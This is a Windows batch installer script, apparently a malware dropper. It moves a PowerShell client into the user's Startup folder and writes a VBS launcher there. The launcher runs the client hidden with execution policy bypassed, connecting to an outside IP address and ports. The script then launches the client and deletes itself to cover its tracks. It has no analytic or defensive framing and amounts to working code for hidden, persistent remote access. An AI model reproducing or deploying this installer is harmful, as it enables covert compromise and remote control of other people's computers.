@echo off
REM Define paths
set "startup_dir=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "ps1_destination=%startup_dir%\client_v3.ps1"
set "vbs_destination=%startup_dir%\run_client.vbs"

REM Copy client_v3.ps1 to the startup directory
move "%~dp0client_v3.ps1" "%ps1_destination%"

REM Create a VBS file in startup to run the PowerShell script completely hidden with parameters
echo Set objShell = CreateObject("WScript.Shell") > "%vbs_destination%"
echo objShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command ""& '%ps1_destination%' 129.154.46.198 8081 5005""", 0, False >> "%vbs_destination%"

REM Run the VBS to start the client immediately
start "" /B wscript.exe "%vbs_destination%"

REM Wait a moment for the script to launch
@REM timeout /t 2 /nobreak >nul

REM Delete this installation script
(goto) 2>nul & del "%~f0"
